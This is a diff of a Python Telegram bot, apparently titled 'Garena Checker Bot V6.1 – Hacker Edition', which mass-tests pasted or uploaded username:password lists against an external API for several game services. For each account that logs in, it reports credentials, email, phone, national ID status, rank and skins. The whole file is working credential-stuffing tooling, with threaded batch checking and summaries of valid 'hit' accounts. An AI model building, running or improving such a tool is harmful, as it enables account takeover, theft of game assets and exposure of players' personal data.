@@ -1,5 +1,5 @@
 # ========================================================================
-#    GARENA CHECKER BOT V6.1 - FULL INFO + CHECK NHIEU + THONG KE
+#    GARENA CHECKER BOT V6.1 - FULL INFO GỌN + WEB
 # ========================================================================
 
 import subprocess, sys, importlib, threading, time, json, os, re, telebot, requests
@@ -255,7 +255,7 @@ CHECKMULTI_BATCH_DELAY = 3.0
 MAX_MESSAGE_LENGTH = 4000
 
 SERVICE_ROUTES = {
-    "lienquan": {"route": "/api/lienquan", "desc": "Lien Quan Mobile", "icon": "🎮", "params": ["tk", "mk"]},
+    "lienquan": {"route": "/api/lienquan", "desc": "Lien Quan", "icon": "🎮", "params": ["tk", "mk"]},
     "miniworld": {"route": "/api/miniworld", "desc": "Mini World", "icon": "🌍", "params": ["tk", "mk"]},
     "blockmango": {"route": "/api/blockmango", "desc": "Blockman Go", "icon": "🧱", "params": ["tk", "mk"]},
     "deltaforce": {"route": "/api/deltaforce", "desc": "Delta Force", "icon": "🔫", "params": ["tk", "mk"]},
@@ -360,7 +360,9 @@ def check_api(user, pwd, service):
         if cache_key in cache_results: return cache_results[cache_key]
     info = SERVICE_ROUTES.get(service, {})
     url = f"{API_BASE}{info.get('route', '/api/lienquan')}"
-    params = {"username": API_USERNAME, "password": API_PASSWORD, info.get('params', ['tk','mk'])[0]: user, info.get('params', ['tk','mk'])[1]: pwd}
+    params = {"username": API_USERNAME, "password": API_PASSWORD, 
+              info.get('params', ['tk','mk'])[0]: user, 
+              info.get('params', ['tk','mk'])[1]: pwd}
     try:
         resp = requests.get(url, params=params, timeout=60)
         if resp.status_code == 200:
@@ -388,89 +390,76 @@ def check_api(user, pwd, service):
     with cache_lock: cache_results[cache_key] = result
     return result
 
+# ========== FORMAT KET QUA GON ==========
 def format_full_info(user, pwd, service, data):
     desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
     
-    # Header
-    msg = f"{icon} <b>HIT - {desc}</b>\n"
-    msg += f"🔑 <b>{user}:{pwd}</b>\n"
+    msg = f"{icon} <b>HIT {desc}</b> | 🔑 {user}:{pwd}\n"
     
-    # Cac truong hien thi theo thu tu
+    # Lay cac truong co gia tri
     fields = [
-        ("👤 UID", "uid"),
-        ("🌐 Region", "region"),
-        ("💲 Sò", "shells"),
-        ("🔥 NAME", "aov_name"),
-        ("👑 RANK", "aov_rank"),
-        ("✨ LEVEL", "aov_level"),
-        ("💎 SKIN", "aov_total_skins"),
-        ("💪 HERO", "aov_total_champs"),
-        ("📩 EMAIL", "email_verified"),
-        ("📱 SĐT", "mobile_bound"),
-        ("🛡 PASS", "password_set"),
-        ("🔗 FB", "fb_linked"),
-        ("🚫 BAND", "banned"),
-        ("⏰ Login cuối", "last_login"),
-        ("📅 Tạo GR", "garena_created"),
-        ("📄 CCCD", "cccd"),
-        ("🛡 Authen", "authen"),
-        ("📋 Tình Trạng", "tinh_trang")
+        ("UID", "uid"), ("Region", "region"), ("Sò", "shells"),
+        ("Name", "aov_name"), ("Rank", "aov_rank"), ("Lv", "aov_level"),
+        ("Skin", "aov_total_skins"), ("Hero", "aov_total_champs"),
+        ("Email", "email_verified"), ("SDT", "mobile_bound"), 
+        ("Pass", "password_set"), ("FB", "fb_linked"), ("Band", "banned"),
+        ("Login", "last_login"), ("Tao GR", "garena_created"),
+        ("CCCD", "cccd"), ("Authen", "authen"), ("Status", "tinh_trang")
     ]
     
+    info = []
     for label, key in fields:
         val = data.get(key)
-        if val not in [None, "", "N/A", 0]:
+        if val not in [None, "", "N/A", 0, False]:
             if isinstance(val, bool): val = "Yes" if val else "No"
             if str(val).lower() in ["true", "false"]: val = "Yes" if val == "true" else "No"
             if str(val).lower() in ["yes", "no"]: val = "Yes" if val == "yes" else "No"
             if isinstance(val, str): val = fix_encoding(val)
-            if label == "📩 EMAIL" and data.get('email'):
-                val = f"{val} [{data.get('email')}]"
-            if label == "📱 SĐT" and data.get('phone'):
-                val = f"{val} [{data.get('phone')}]"
-            msg += f"  {label}: {val}\n"
+            if label == "Email" and data.get('email'): val = f"{val}({data.get('email')})"
+            if label == "SDT" and data.get('phone'): val = f"{val}({data.get('phone')})"
+            info.append(f"{label}:{val}")
     
-    # Danh sach SS, Anime, Other
+    msg += "  " + " | ".join(info[:8]) + "\n"
+    if len(info) > 8:
+        msg += "  " + " | ".join(info[8:16]) + "\n"
+    if len(info) > 16:
+        msg += "  " + " | ".join(info[16:]) + "\n"
+    
+    # Collections
     collections = [
-        ("aov_ss_list", "✨ SS"),
-        ("aov_anime_list", "🔥 Anime"),
-        ("aov_other_list", "🎲 Other")
+        ("aov_ss_list", "SS"), ("aov_anime_list", "Anime"), ("aov_other_list", "Other")
     ]
     for key, label in collections:
         lst = data.get(key, [])
         if lst:
-            names = [fix_encoding(str(i)) for i in lst[:5]]
-            more = f" +{len(lst)-5}" if len(lst) > 5 else ""
+            names = [fix_encoding(str(i)) for i in lst[:3]]
+            more = f"+{len(lst)-3}" if len(lst) > 3 else ""
             msg += f"  {label}: {', '.join(names)}{more}\n"
     
     return msg
 
 def format_dead(user, pwd, service):
-    return f"❌ <b>DEAD - {SERVICE_ROUTES.get(service,{}).get('desc',service)}</b>\n🔑 <code>{user}:{pwd}</code>"
+    return f"❌ DEAD {SERVICE_ROUTES.get(service,{}).get('desc',service)} | 🔑 {user}:{pwd}"
 
 def format_error(user, pwd, service):
-    return f"⚠️ <b>ERROR - {SERVICE_ROUTES.get(service,{}).get('desc',service)}</b>\n🔑 <code>{user}:{pwd}</code>"
+    return f"⚠️ ERROR {SERVICE_ROUTES.get(service,{}).get('desc',service)} | 🔑 {user}:{pwd}"
 
 # ========== COMMANDS ==========
 @bot.message_handler(commands=['start'])
 def cmd_start(msg):
     if not check_membership(msg): return
     safe_send(msg.chat.id, f"""🤖 <b>GARENA CHECKER V6.1</b>
-👤 Admin: @baohuyno1
-🎵 TikTok: @baohuy1109
+👤 @baohuyno1 | 🎵 @baohuy1109
 
-📌 <b>LENH:</b>
-/check user:pass - Check 1 acc
-/checkmulti user1:pass1,user2:pass2 - Check nhieu
-/checkall - Check tat ca service
-/services - Danh sach service
-/stats - Thong ke
-/stop - Dung check
+📌 /check user:pass - Check 1 acc
+📌 /checkmulti - Check nhieu acc
+📌 /checkall - Check tat ca service
+📌 /services - Danh sach service
+📌 /stats - Thong ke
+📌 /stop - Dung check
 
-⚠️ KHONG LUU ACCOUNT
-🔊 AUTO AUDIO TREN WEB
-📊 FULL INFO CHI TIET""")
+⚠️ KHONG LUU ACCOUNT | AUTO AUDIO""")
 
 @bot.message_handler(commands=['stats'])
 def cmd_stats(msg):
@@ -478,35 +467,33 @@ def cmd_stats(msg):
     data = load_stats()
     with SESSION_LOCK:
         s = SESSION_STATS
-    safe_send(msg.chat.id, f"""📊 <b>THONG KE TONG</b>
+    safe_send(msg.chat.id, f"""📊 <b>THONG KE</b>
 ━━━━━━━━━━━━━━━━
 📦 Tong check: {data.get('total_checked',0)}
-✅ Tong hits: {data.get('total_hits',0)}
-❌ Tong dead: {data.get('total_dead',0)}
-⚠️ Tong errors: {data.get('total_errors',0)}
+✅ Hits: {data.get('total_hits',0)}
+❌ Dead: {data.get('total_dead',0)}
+⚠️ Errors: {data.get('total_errors',0)}
 ━━━━━━━━━━━━━━━━
-📊 <b>SESSION NAY</b>
+📊 SESSION:
 ✅ Hits: {s.get('total_hits',0)}
 ❌ Dead: {s.get('total_dead',0)}
 ⚠️ Errors: {s.get('total_errors',0)}
-📦 Checked: {s.get('total_checked',0)}
-⏰ Lan cuoi: {data.get('last_check','Chua co')}""")
+📦 Checked: {s.get('total_checked',0)}""")
 
 @bot.message_handler(commands=['services'])
 def cmd_services(msg):
     if not check_membership(msg): return
-    msg_text = "📋 <b>DICH VU HO TRO:</b>\n\n"
-    for k, v in SERVICE_ROUTES.items():
-        msg_text += f"{v['icon']} <b>{k}</b>: {v['desc']}\n"
-    safe_send(msg.chat.id, msg_text)
+    m = "📋 SERVICES:\n"
+    for k,v in SERVICE_ROUTES.items():
+        m += f"{v['icon']} {k}: {v['desc']}\n"
+    safe_send(msg.chat.id, m)
 
 @bot.message_handler(commands=['stop'])
 def cmd_stop(msg):
     if not check_membership(msg): return
     global checking
-    stop_event.set()
-    checking = False
-    safe_send(msg.chat.id, "🛑 Da dung check!")
+    stop_event.set(); checking = False
+    safe_send(msg.chat.id, "🛑 Stopped!")
 
 @bot.message_handler(commands=['check'])
 def cmd_check(msg):
@@ -519,9 +506,9 @@ def cmd_check(msg):
     service = parts[2] if len(parts) > 2 and parts[2] in SERVICE_ROUTES else "lienquan"
     accounts = loc_accounts(acc)
     if not accounts:
-        safe_send(msg.chat.id, "❌ Sai format! Dung: user:pass")
+        safe_send(msg.chat.id, "❌ Sai format!")
         return
-    u, p = accounts[0]
+    u,p = accounts[0]
     threading.Thread(target=lambda: do_check(msg.chat.id, u, p, service)).start()
 
 @bot.message_handler(commands=['checkmulti'])
@@ -533,16 +520,13 @@ def cmd_checkmulti(msg):
         return
     lines = text.split('\n')
     service = "lienquan"
-    if lines:
-        last = lines[-1].strip()
-        if last in SERVICE_ROUTES:
-            service = last
-            lines = lines[:-1]
+    if lines and lines[-1].strip() in SERVICE_ROUTES:
+        service = lines[-1].strip(); lines = lines[:-1]
     accounts = loc_accounts('\n'.join(lines).replace(',', '\n').replace('|', ':'))
     if not accounts:
         safe_send(msg.chat.id, "❌ Khong tim thay acc!")
         return
-    safe_send(msg.chat.id, f"📊 Check {len(accounts)} accounts...")
+    safe_send(msg.chat.id, f"📊 Check {len(accounts)} acc...")
     threading.Thread(target=lambda: do_batch(msg.chat.id, accounts, service)).start()
 
 @bot.message_handler(commands=['checkall'])
@@ -554,7 +538,7 @@ def cmd_checkall(msg):
         pending_accounts[chat_id] = []
         threading.Thread(target=lambda: do_all(chat_id, accs)).start()
     else:
-        safe_send(chat_id, "❌ Khong co acc nao dang cho!")
+        safe_send(chat_id, "❌ Khong co acc!")
 
 @bot.message_handler(content_types=['text'])
 def handle_text(msg):
@@ -564,15 +548,15 @@ def handle_text(msg):
     accounts = loc_accounts(text.replace('|', ':'))
     if not accounts: return
     pending_accounts[msg.chat.id] = accounts
-    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
-    safe_send(msg.chat.id, f"📊 LOC {len(accounts)} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca\n⚠️ KHONG LUU ACCOUNT!")
+    preview = '\n'.join([f"{u}:{p}" for u,p in accounts[:10]])
+    safe_send(msg.chat.id, f"📊 LOC {len(accounts)} ACC\n{preview}\n👇 /checkall")
 
 @bot.message_handler(content_types=['document'])
 def handle_doc(msg):
     if not check_membership(msg): return
     try:
         if not msg.document.file_name.endswith('.txt'):
-            safe_send(msg.chat.id, "❌ Chi ho tro file .txt!")
+            safe_send(msg.chat.id, "❌ Chi .txt!")
             return
         file = bot.get_file(msg.document.file_id)
         content = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
@@ -581,21 +565,20 @@ def handle_doc(msg):
             safe_send(msg.chat.id, "❌ Khong tim thay acc!")
             return
         pending_accounts[msg.chat.id] = accounts
-        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
-        safe_send(msg.chat.id, f"✅ LOC {len(accounts)} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca\n⚠️ KHONG LUU ACCOUNT!")
+        preview = '\n'.join([f"{u}:{p}" for u,p in accounts[:20]])
+        safe_send(msg.chat.id, f"✅ LOC {len(accounts)} ACC\n{preview}\n👇 /checkall")
     except Exception as e:
         safe_send(msg.chat.id, f"❌ Loi: {e}")
 
 # ========== CHECK FUNCTIONS ==========
 def do_check(chat_id, user, pwd, service):
     result = check_api(user, pwd, service)
-    res_type = result.get('result', 'unknown')
-    detail = {"user": user, "pwd": pwd, "service": service, "status": res_type, "time": datetime.now().strftime("%H:%M:%S")}
-    
-    if res_type == 'hit':
+    res = result.get('result', 'unknown')
+    detail = {"user": user, "pwd": pwd, "service": service, "status": res, "time": datetime.now().strftime("%H:%M:%S")}
+    if res == 'hit':
         safe_send(chat_id, format_full_info(user, pwd, service, result))
         update_stats(hit=1, details=[detail])
-    elif res_type == 'dead':
+    elif res == 'dead':
         safe_send(chat_id, format_dead(user, pwd, service))
         update_stats(dead=1, details=[detail])
     else:
@@ -605,148 +588,110 @@ def do_check(chat_id, user, pwd, service):
 def do_batch(chat_id, accounts, service):
     global checking, stats
     if checking:
-        safe_send(chat_id, "⚠️ Dang check roi!")
-        return
-    
-    checking = True
-    stop_event.clear()
+        safe_send(chat_id, "⚠️ Dang check!"); return
+    checking = True; stop_event.clear()
     total = len(accounts)
     stats = {"total": total, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "start_time": time.time()}
     all_results = []
+    safe_send(chat_id, f"🔍 CHECK {total} acc | {SERVICE_ROUTES.get(service,{}).get('desc',service)}")
     
-    safe_send(chat_id, f"🔍 <b>BAT DAU CHECK</b>\n📊 {total} acc | {SERVICE_ROUTES.get(service,{}).get('desc',service)}")
-    
-    def process(user, pwd):
+    def process(u,p):
         if stop_event.is_set(): return
-        r = check_api(user, pwd, service)
-        res = r.get('result', 'unknown')
-        detail = {"user": user, "pwd": pwd, "service": service, "status": res, "time": datetime.now().strftime("%H:%M:%S")}
-        all_results.append(detail)
+        r = check_api(u,p,service)
+        res = r.get('result','unknown')
+        d = {"user":u,"pwd":p,"service":service,"status":res,"time":datetime.now().strftime("%H:%M:%S")}
+        all_results.append(d)
         with stats_lock:
             stats["checked"] += 1
             if res == 'hit':
                 stats["hits"] += 1
-                safe_send(chat_id, format_full_info(user, pwd, service, r))
+                safe_send(chat_id, format_full_info(u,p,service,r))
             elif res == 'dead':
                 stats["dead"] += 1
             else:
                 stats["errors"] += 1
     
-    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0, total, CHECKMULTI_BATCH_SIZE)]
-    for idx, batch in enumerate(batches, 1):
+    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0,total,CHECKMULTI_BATCH_SIZE)]
+    for idx,batch in enumerate(batches,1):
         if stop_event.is_set(): break
-        safe_send(chat_id, f"📦 BATCH {idx}/{len(batches)} - {len(batch)} acc...")
         with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as ex:
-            futures = {ex.submit(process, u, p): (u, p) for u, p in batch}
+            futures = {ex.submit(process,u,p):(u,p) for u,p in batch}
             for f in as_completed(futures):
-                if stop_event.is_set():
-                    ex.shutdown(wait=False)
-                    break
-        elapsed = time.time() - stats["start_time"]
-        pct = (stats["checked"] / total) * 100 if total > 0 else 0
-        safe_send(chat_id, f"📊 {stats['checked']}/{total} ({pct:.1f}%) | ✅{stats['hits']} ❌{stats['dead']} ⚠️{stats['errors']}")
-        if idx < len(batches):
-            time.sleep(CHECKMULTI_BATCH_DELAY)
+                if stop_event.is_set(): ex.shutdown(wait=False); break
+        pct = (stats["checked"]/total)*100
+        safe_send(chat_id, f"📊 {stats['checked']}/{total} ({pct:.1f}%) | ✅{stats['hits']} ❌{stats['dead']}")
+        if idx < len(batches): time.sleep(CHECKMULTI_BATCH_DELAY)
     
     checking = False
-    elapsed = time.time() - stats["start_time"]
     update_stats(hit=stats["hits"], dead=stats["dead"], err=stats["errors"], accounts=accounts, details=all_results)
-    
-    # Tong ket
-    summary = f"✅ <b>CHECK HOAN TAT!</b>\n✅{stats['hits']} ❌{stats['dead']} ⚠️{stats['errors']}\n⏱ {elapsed:.1f}s"
-    hits = [r for r in all_results if r['status'] == 'hit']
+    hits = [r for r in all_results if r['status']=='hit']
+    m = f"✅ HOAN TAT! ✅{stats['hits']} ❌{stats['dead']} ⚠️{stats['errors']} ⏱{time.time()-stats['start_time']:.1f}s"
     if hits:
-        summary += f"\n📌 HIT: {len(hits)}"
-        for r in hits[:10]:
-            summary += f"\n  ✅ {r['user']}:{r['pwd']}"
-        if len(hits) > 10:
-            summary += f"\n  ... +{len(hits)-10}"
-    safe_send(chat_id, summary)
+        m += f"\n📌 HIT: {len(hits)}"
+        for r in hits[:10]: m += f"\n  ✅ {r['user']}:{r['pwd']}"
+        if len(hits)>10: m += f"\n  ... +{len(hits)-10}"
+    safe_send(chat_id, m)
 
 def do_all(chat_id, accounts):
     global checking
     if checking:
-        safe_send(chat_id, "⚠️ Dang check roi!")
-        return
-    if not accounts:
-        safe_send(chat_id, "❌ Khong co accounts!")
-        return
-    
-    checking = True
-    stop_event.clear()
+        safe_send(chat_id, "⚠️ Dang check!"); return
+    checking = True; stop_event.clear()
     total_services = len(SERVICE_ROUTES)
     all_results = []
-    stats_all = {"total": len(accounts) * total_services, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "start_time": time.time()}
+    stats_all = {"total": len(accounts)*total_services, "checked":0, "hits":0, "dead":0, "errors":0, "start_time":time.time()}
+    safe_send(chat_id, f"⚡ CHECK ALL | {len(accounts)} acc x {total_services}")
     
-    safe_send(chat_id, f"⚡ <b>CHECK TAT CA SERVICE</b>\n📊 {len(accounts)} acc x {total_services} services")
-    
-    def process(user, pwd, svc):
+    def process(u,p,svc):
         if stop_event.is_set(): return
-        r = check_api(user, pwd, svc)
-        res = r.get('result', 'unknown')
-        detail = {"user": user, "pwd": pwd, "service": svc, "status": res, "time": datetime.now().strftime("%H:%M:%S")}
-        all_results.append(detail)
+        r = check_api(u,p,svc)
+        res = r.get('result','unknown')
+        d = {"user":u,"pwd":p,"service":svc,"status":res,"time":datetime.now().strftime("%H:%M:%S")}
+        all_results.append(d)
         with stats_lock:
             stats_all["checked"] += 1
             if res == 'hit':
                 stats_all["hits"] += 1
-                safe_send(chat_id, format_full_info(user, pwd, svc, r))
+                safe_send(chat_id, format_full_info(u,p,svc,r))
             elif res == 'dead':
                 stats_all["dead"] += 1
             else:
                 stats_all["errors"] += 1
     
-    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE)]
-    for idx, batch in enumerate(batches, 1):
+    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0,len(accounts),CHECKMULTI_BATCH_SIZE)]
+    for idx,batch in enumerate(batches,1):
         if stop_event.is_set(): break
-        tasks = [(u, p, svc) for u, p in batch for svc in SERVICE_ROUTES.keys()]
+        tasks = [(u,p,svc) for u,p in batch for svc in SERVICE_ROUTES.keys()]
         with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as ex:
-            futures = {ex.submit(process, u, p, svc): (u, p, svc) for u, p, svc in tasks}
+            futures = {ex.submit(process,u,p,svc):(u,p,svc) for u,p,svc in tasks}
             for f in as_completed(futures):
-                if stop_event.is_set():
-                    ex.shutdown(wait=False)
-                    break
-        pct = (stats_all["checked"] / stats_all["total"]) * 100 if stats_all["total"] > 0 else 0
+                if stop_event.is_set(): ex.shutdown(wait=False); break
+        pct = (stats_all["checked"]/stats_all["total"])*100 if stats_all["total"]>0 else 0
         safe_send(chat_id, f"📊 {stats_all['checked']}/{stats_all['total']} ({pct:.1f}%) | ✅{stats_all['hits']}")
-        if idx < len(batches):
-            time.sleep(CHECKMULTI_BATCH_DELAY)
+        if idx < len(batches): time.sleep(CHECKMULTI_BATCH_DELAY)
     
     checking = False
-    elapsed = time.time() - stats_all["start_time"]
     update_stats(hit=stats_all["hits"], dead=stats_all["dead"], err=stats_all["errors"], accounts=accounts, details=all_results)
-    
-    summary = f"✅ <b>CHECK ALL HOAN TAT!</b>\n✅{stats_all['hits']} ❌{stats_all['dead']} ⚠️{stats_all['errors']}\n⏱ {elapsed:.1f}s"
-    hits = [r for r in all_results if r['status'] == 'hit']
+    hits = [r for r in all_results if r['status']=='hit']
+    m = f"✅ CHECK ALL HOAN TAT! ✅{stats_all['hits']} ❌{stats_all['dead']} ⚠️{stats_all['errors']}"
     if hits:
-        summary += f"\n📌 HIT: {len(hits)}"
-        for r in hits[:10]:
-            summary += f"\n  ✅ {r['user']}:{r['pwd']} ({r['service']})"
-        if len(hits) > 10:
-            summary += f"\n  ... +{len(hits)-10}"
-    safe_send(chat_id, summary)
+        m += f"\n📌 HIT: {len(hits)}"
+        for r in hits[:10]: m += f"\n  ✅ {r['user']}:{r['pwd']} ({r['service']})"
+        if len(hits)>10: m += f"\n  ... +{len(hits)-10}"
+    safe_send(chat_id, m)
 
 # ========== MAIN ==========
 def main():
-    print("=" * 50)
+    print("="*50)
     print("    GARENA CHECKER V6.1 - HACKER EDITION")
-    print("    ADMIN: @baohuyno1")
-    print("    TIKTOK: @baohuy1109")
-    print("    ===== HIEU UNG 3D + HACKER DEP =====")
-    print("    ===== AM THANH TU DONG PHAT =====")
-    print("    ===== KHONG LUU ACCOUNT =====")
-    print("    ===== FULL INFO CHI TIET =====")
-    print("=" * 50)
-    
+    print("    ADMIN: @baohuyno1 | TIKTOK: @baohuy1109")
+    print("    WEB: http://0.0.0.0:10000")
+    print("    AUDIO FIXED | FULL INFO GON | NO SAVE")
+    print("="*50)
     while True:
-        try:
-            bot.polling(none_stop=True, interval=1, timeout=30)
-        except Exception as e:
-            print(f"[!] Loi: {e}")
-            time.sleep(5)
+        try: bot.polling(none_stop=True, interval=1, timeout=30)
+        except Exception as e: print(f"[!] {e}"); time.sleep(5)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n[!] Bot stopped!")
-        sys.exit(0)
+    try: main()
+    except KeyboardInterrupt: print("\n[!] Stopped!"); sys.exit(0)
